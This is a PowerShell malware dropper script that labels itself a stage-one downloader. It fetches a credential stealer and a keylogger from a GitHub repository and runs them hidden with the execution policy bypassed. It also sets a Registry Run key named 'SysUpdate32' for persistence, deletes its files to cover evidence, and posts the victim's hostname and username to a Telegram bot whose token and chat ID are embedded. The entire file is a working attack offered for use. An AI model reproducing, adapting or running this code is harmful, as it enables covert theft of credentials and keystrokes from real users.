# payload_final.ps1 — Stage 1 downloader/executor
# Downloads stealer.ps1, keylogger.ps1, executes them, sends SUCCESS to Telegram

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$repoBase = "https://raw.githubusercontent.com/isajarGamer2/stealer-repo/main"
$tempDir = "$env:TEMP\sysupdate_$(Get-Random -Maximum 9999)"
$logFile = "$env:TEMP\payload_debug.log"

function Write-Log {
    param([string]$Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
    Write-Host $Msg
}

# Create working directory
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Set-Location $tempDir

Write-Log "[*] Starting payload from $tempDir"

# Download components with cache-busting
$files = @("stealer.ps1", "keylogger.ps1")
foreach ($file in $files) {
    $url = "$repoBase/$file?v=$(Get-Random)"
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile "$tempDir\$file" -ErrorAction Stop
        Write-Log "[+] Downloaded: $file"
    } catch {
        Write-Log "[-] Failed: $file - $($_.Exception.Message)"
        exit 1
    }
}

# Verify downloads
foreach ($file in $files) {
    if (-not (Test-Path "$tempDir\$file")) {
        Write-Log "[-] Missing: $file"
        exit 1
    }
    $size = (Get-Item "$tempDir\$file").Length
    Write-Log "[*] $file : $size bytes"
}

# Execute stealer — capture output and errors
Write-Log "[*] Executing stealer.ps1..."
$psOutput = powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "$tempDir\stealer.ps1" 2>&1
if ($psOutput) { Write-Log "[stealer output] $psOutput" }

# Persistence - Registry Run key
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate32"
$regValue = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempDir\stealer.ps1`""
try {
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
    Write-Log "[+] Persistence established: $regName"
} catch {
    Write-Log "[-] Persistence failed: $($_.Exception.Message)"
}

# Cleanup evidence
Remove-Item "$tempDir\*.ps1" -Force -ErrorAction SilentlyContinue

# SUCCESS signal
Write-Host ""
Write-Host "SUCCESS" -ForegroundColor Green -BackgroundColor Black
Write-Host ""
Write-Log "[*] SUCCESS displayed"

# Send success to Telegram — with error reporting
$msg = "[+] PAYLOAD EXECUTED`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
try {
    $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
        chat_id = $chatId
        text = $msg
    } -ErrorAction Stop
    Write-Log "[+] Telegram message sent: $($response.result.message_id)"
} catch {
    Write-Log "[-] Telegram FAILED: $($_.Exception.Message)"
    # Try alternative method
    try {
        $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($msg))"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
        $result = $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body)
        Write-Log "[+] Telegram via WebClient: $result"
    } catch {
        Write-Log "[-] Telegram WebClient FAILED: $($_.Exception.Message)"
    }
}
